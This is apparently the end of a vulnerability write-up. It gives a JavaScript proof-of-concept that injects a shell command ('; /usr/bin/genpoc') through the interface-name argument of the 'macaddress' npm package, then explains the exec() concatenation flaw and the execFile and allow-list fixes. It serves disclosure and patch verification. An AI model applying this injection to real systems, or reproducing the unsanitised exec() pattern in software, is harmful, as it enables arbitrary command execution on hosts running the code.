const macaddress = require('macaddress');

async function exploit() {
   // Crafted interface name to trigger command injection in the underlying exec() call.
   // The vulnerable code concatenates this directly into a shell string like:
   // `cat /sys/class/net/<INJECTED_IFACE>/address`
   const injectedIface = "; /usr/bin/genpoc";

   console.log(`[PoC] Triggering command injection via crafted interface name: "${injectedIface}"`);

   // macaddress.one() will pass 'injectedIface' directly to child_process.exec()
   // without any sanitization, causing the shell to execute the injected payload.
   const resultPromise = new Promise((resolve) => {
     macaddress.one(injectedIface, (err, mac) => {
       if (err) {
         console.log(`[PoC] Callback error reported (expected due to command failure/injection): ${err.message || err}`);
       } else {
         console.log(`[PoC] MAC retrieved: ${mac}`);
       }

       // Resolve immediately after callback fires; actual RCE happened in exec()
       resolve();
     });
   });

   await resultPromise;
}

await exploit();
```

### 🔍 Why This Demonstrates the Vulnerability

1. **Input → Shell Concatenation**: The `macaddress` package (prior to the fix) uses `child_process.exec()` on Linux/macOS/unix platforms like:
   ```js
   exec("cat /sys/class/net/" + iface + "/address", callback);
   ```
2. **Lack of Sanitization**: The `iface` parameter is passed directly into the shell command without filtering or escaping. When we supply `"; /usr/bin/genpoc"`, the final string evaluated by `/bin/sh` becomes:
   ```sh
   cat /sys/class/net/; /usr/bin/genpoc /address
   ```
3. **Shell Metacharacter Interpretation**: The semicolon (`;`) tells the shell to terminate the previous command and immediately execute the next one. Since `cat /sys/class/net/` points to a non-existent path, it fails silently in the context of the injection vector, but the shell proceeds to execute `/usr/bin/genpoc`. This confirms **arbitrary command execution**.
4. **Attack Surface**: While this PoC directly invokes the internal API, real-world exploitation typically occurs when `macaddress` is integrated into applications that allow unvalidated network interface names (e.g., DHCP client wrappers, network configuration GUIs, or cloud-init scripts) to be passed to `macaddress.one()` or `macaddress.all()`.

### 🛡️ Mitigation Context (Based on Provided Commit)
The referenced commit fixes this by:
- **Replacing `exec` with `execFile`**: `execFile` passes arguments as literal vectors, completely bypassing shell interpretation. Metacharacters like `;`, `|`, `$()`, etc., are treated as harmless filename characters rather than commands.
- **Input Validation/Whitelisting**: Proper patches typically validate that the interface name matches expected regex patterns (e.g., `^[a-zA-Z0-9._-]+$`) before passing it to any OS query, ensuring no unexpected shell syntax can be injected.

This PoC is strictly for educational purposes to help developers verify the severity of the issue and confirm that patching removes the execution path on insecure environments before deployment.

